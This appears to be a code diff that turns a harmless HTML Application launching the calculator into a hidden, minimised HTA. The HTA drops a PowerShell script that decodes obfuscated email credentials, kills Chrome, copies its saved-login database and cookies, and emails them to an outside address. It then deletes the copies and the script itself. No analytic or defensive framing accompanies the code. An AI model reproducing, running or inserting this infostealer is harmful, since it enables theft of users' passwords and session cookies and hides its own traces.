@@ -1,9 +1,70 @@
 <html>
 <head>
-<script language="JScript">
-    var shell = new ActiveXObject("WScript.Shell");
-    shell.Run("calc.exe");
-    window.close();
+<hta:application 
+    id="oBypass" 
+    border="none" 
+    caption="no" 
+    showintaskbar="no" 
+    singleinstance="yes" 
+    sysmenu="no" 
+    windowstate="minimize"/>
+
+<script language="VBScript">
+Option Explicit
+Dim fso, shell, tmp, psPath, ts
+
+Set fso   = CreateObject("Scripting.FileSystemObject")
+Set shell = CreateObject("WScript.Shell")
+tmp       = shell.ExpandEnvironmentStrings("%TEMP%")
+psPath    = tmp & "\~" & Hex(Rnd * 9999999) & ".ps1"
+
+Set ts = fso.CreateTextFile(psPath, True, True)
+
+ts.WriteLine "$ErrorActionPreference = 'SilentlyContinue'"
+ts.WriteLine ""
+ts.WriteLine "$encUser = 'EQkCEQ4NRFFbEgsjFQgVWF4dEAoO'"
+ts.WriteLine "$encPass = 'CwsTC0UVU11CUxISBghUSEVRFw=='"
+ts.WriteLine "$key     = 'secret123'"
+ts.WriteLine ""
+ts.WriteLine "$userBytes = [Convert]::FromBase64String($encUser)"
+ts.WriteLine "$passBytes = [Convert]::FromBase64String($encPass)"
+ts.WriteLine "$user = ''; $pass = ''"
+ts.WriteLine "for($i=0; $i -lt $userBytes.Length; $i++) { $user += [char]($userBytes[$i] -bxor [byte][char]$key[$i % $key.Length]) }"
+ts.WriteLine "for($i=0; $i -lt $passBytes.Length; $i++) { $pass += [char]($passBytes[$i] -bxor [byte][char]$key[$i % $key.Length]) }"
+ts.WriteLine ""
+ts.WriteLine "Stop-Process -Name chrome -Force -ea 0"
+ts.WriteLine ""
+ts.WriteLine "$src = ""$env:LOCALAPPDATA\Google\Chrome\User Data\Default"""
+ts.WriteLine "$dst = ""$env:TEMP\st0len"""
+ts.WriteLine "md $dst -ea 0"
+ts.WriteLine "Copy-Item -Path ""$src\Login Data""       -Destination $dst -ea 0"
+ts.WriteLine "Copy-Item -Path ""$src\Network\Cookies""   -Destination $dst -ea 0"
+ts.WriteLine ""
+ts.WriteLine "$smtp = 'smtp.gmail.com'"
+ts.WriteLine "$port = 587"
+ts.WriteLine "$from = $user"
+ts.WriteLine "$to   = 'yuchan8003@naver.com'"
+ts.WriteLine "$subj = 'Chrome Leak Test'"
+ts.WriteLine "$body = 'Check attached files'"
+ts.WriteLine ""
+ts.WriteLine "$secPass = ConvertTo-SecureString $pass -AsPlainText -Force"
+ts.WriteLine "$cred   = New-Object PSCredential($from, $secPass)"
+ts.WriteLine ""
+ts.WriteLine "try {"
+ts.WriteLine "    Send-MailMessage -From $from -To $to -Subject $subj -Body $body ``"
+ts.WriteLine "        -SmtpServer $smtp -Credential $cred -UseSsl -Port $port ``"
+ts.WriteLine "        -Attachments ""$dst\Login Data"",""$dst\Cookies"" -ea Stop"
+ts.WriteLine "} catch { }"
+ts.WriteLine ""
+ts.WriteLine "Remove-Item $dst -Recurse -Force -ea 0"
+ts.WriteLine "Remove-Item $PSCommandPath -Force -ea 0"
+ts.WriteLine "exit"
+
+ts.Close
+
+shell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & psPath & """", 0, False
+
+window.close
 </script>
 </head>
 <body></body>
